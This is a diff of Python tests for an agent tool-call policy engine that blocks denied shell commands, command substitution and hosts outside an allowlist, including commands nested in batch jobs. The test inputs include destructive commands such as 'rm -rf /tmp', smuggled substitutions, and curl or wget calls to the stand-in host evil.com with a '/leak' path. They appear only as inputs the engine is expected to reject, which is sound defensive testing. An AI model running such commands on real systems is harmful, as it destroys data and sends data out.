@@ -193,20 +193,26 @@ def test_policy_engine_enforces_directory_shell_and_network_fields(tmp_path: Pat
             tool_name="bash.exec",
             params={"session_id": "session-1", "chars": "rm -rf /tmp\n"},
         )
-    with pytest.raises(PolicyViolationError, match="Shell command substitution is not allowed by policy"):
+    with pytest.raises(
+        PolicyViolationError, match="Shell command substitution is not allowed by policy"
+    ):
         engine.ensure_tool_call_allowed(
             policy=policy,
             tool_name="debug.echo",
             params={"cmd": "ls $(rm -rf /tmp)"},
         )
-    with pytest.raises(PolicyViolationError, match="Shell command substitution is not allowed by policy"):
+    with pytest.raises(
+        PolicyViolationError, match="Shell command substitution is not allowed by policy"
+    ):
         engine.ensure_tool_call_allowed(
             policy=policy,
             tool_name="debug.echo",
             params={"cmd": "ls `rm -rf /tmp`"},
         )
 
-    with pytest.raises(PolicyViolationError, match="Network host is not allowed by policy: evil.com"):
+    with pytest.raises(
+        PolicyViolationError, match="Network host is not allowed by policy: evil.com"
+    ):
         engine.ensure_tool_call_allowed(
             policy=policy,
             tool_name="debug.echo",
@@ -216,23 +222,88 @@ def test_policy_engine_enforces_directory_shell_and_network_fields(tmp_path: Pat
         shell_allowed_commands_json='["curl","wget","ping"]',
         network_allowlist_json='["example.com"]',
     )
-    with pytest.raises(PolicyViolationError, match="Network host is not allowed by policy: evil.com"):
+    with pytest.raises(
+        PolicyViolationError, match="Network host is not allowed by policy: evil.com"
+    ):
         engine.ensure_tool_call_allowed(
             policy=network_shell_policy,
             tool_name="debug.echo",
             params={"cmd": "curl evil.com"},
         )
-    with pytest.raises(PolicyViolationError, match="Network host is not allowed by policy: evil.com"):
+    with pytest.raises(
+        PolicyViolationError, match="Network host is not allowed by policy: evil.com"
+    ):
         engine.ensure_tool_call_allowed(
             policy=network_shell_policy,
             tool_name="debug.echo",
             params={"cmd": "wget evil.com"},
         )
-    with pytest.raises(PolicyViolationError, match="Network host is not allowed by policy: evil.com"):
+    with pytest.raises(
+        PolicyViolationError, match="Network host is not allowed by policy: evil.com"
+    ):
         engine.ensure_tool_call_allowed(
             policy=network_shell_policy,
             tool_name="debug.echo",
             params={"cmd": "ping evil.com"},
+        )
+
+
+def test_policy_engine_recurses_into_session_job_run_commands(tmp_path: Path) -> None:
+    """Nested session.job.run commands should not bypass policy extraction."""
+
+    allow_dir = (tmp_path / "allowed").resolve()
+    outside_dir = (tmp_path / "outside").resolve()
+    allow_dir.mkdir(parents=True)
+    policy = _policy(
+        allowed_directories_json=f'["{allow_dir}"]',
+        shell_allowed_commands_json='["echo","curl"]',
+        shell_denied_commands_json='["rm"]',
+        network_allowlist_json='["example.com"]',
+    )
+    engine = PolicyEngine(root_dir=tmp_path)
+
+    engine.ensure_tool_call_allowed(
+        policy=policy,
+        tool_name="session.job.run",
+        params={
+            "jobs": [
+                {"kind": "bash", "cmd": "echo ok", "cwd": str(allow_dir)},
+                {
+                    "kind": "bash",
+                    "cmd": "curl https://api.example.com/v1",
+                    "cwd": str(allow_dir / "nested"),
+                },
+            ],
+        },
+    )
+
+    with pytest.raises(PolicyViolationError, match="Path is not allowed by policy"):
+        engine.ensure_tool_call_allowed(
+            policy=policy,
+            tool_name="session.job.run",
+            params={"jobs": [{"kind": "bash", "cmd": "echo ok", "cwd": str(outside_dir)}]},
+        )
+    with pytest.raises(PolicyViolationError, match="Shell command is denied by policy: rm"):
+        engine.ensure_tool_call_allowed(
+            policy=policy,
+            tool_name="session.job.run",
+            params={
+                "jobs": [
+                    {"kind": "bash", "cmd": "echo ok && rm -rf /tmp", "cwd": str(allow_dir)}
+                ]
+            },
+        )
+    with pytest.raises(
+        PolicyViolationError, match="Network host is not allowed by policy: evil.com"
+    ):
+        engine.ensure_tool_call_allowed(
+            policy=policy,
+            tool_name="session.job.run",
+            params={
+                "jobs": [
+                    {"kind": "bash", "cmd": "curl https://evil.com/leak", "cwd": str(allow_dir)}
+                ]
+            },
         )
 
 
@@ -354,7 +425,9 @@ def test_policy_engine_enforces_network_allowlist_for_shell_command_urls() -> No
         params={"cmd": "curl https://api.example.com/v1"},
     )
 
-    with pytest.raises(PolicyViolationError, match="Network host is not allowed by policy: evil.com"):
+    with pytest.raises(
+        PolicyViolationError, match="Network host is not allowed by policy: evil.com"
+    ):
         engine.ensure_tool_call_allowed(
             policy=policy,
             tool_name="bash.exec",
@@ -374,7 +447,9 @@ def test_policy_engine_ignores_malformed_ipv6_like_shell_tokens() -> None:
         params={"cmd": "curl [oops[ https://api.example.com/v1"},
     )
 
-    with pytest.raises(PolicyViolationError, match="Network host is not allowed by policy: evil.com"):
+    with pytest.raises(
+        PolicyViolationError, match="Network host is not allowed by policy: evil.com"
+    ):
         engine.ensure_tool_call_allowed(
             policy=policy,
             tool_name="bash.exec",
@@ -397,7 +472,9 @@ def test_policy_engine_enforces_network_allowlist_for_shell_ssh_hosts() -> None:
     )
 
     # Assert
-    with pytest.raises(PolicyViolationError, match="Network host is not allowed by policy: evil.com"):
+    with pytest.raises(
+        PolicyViolationError, match="Network host is not allowed by policy: evil.com"
+    ):
         engine.ensure_tool_call_allowed(
             policy=policy,
             tool_name="bash.exec",
@@ -414,7 +491,9 @@ def test_policy_engine_enforces_network_allowlist_for_ssh_jump_hosts() -> None:
 
     # Act
     # Assert
-    with pytest.raises(PolicyViolationError, match="Network host is not allowed by policy: evil.com"):
+    with pytest.raises(
+        PolicyViolationError, match="Network host is not allowed by policy: evil.com"
+    ):
         engine.ensure_tool_call_allowed(
             policy=policy,
             tool_name="bash.exec",
@@ -431,7 +510,9 @@ def test_policy_engine_enforces_network_allowlist_for_ssh_jump_host_chains() -> 
 
     # Act
     # Assert
-    with pytest.raises(PolicyViolationError, match="Network host is not allowed by policy: evil.com"):
+    with pytest.raises(
+        PolicyViolationError, match="Network host is not allowed by policy: evil.com"
+    ):
         engine.ensure_tool_call_allowed(
             policy=policy,
             tool_name="bash.exec",
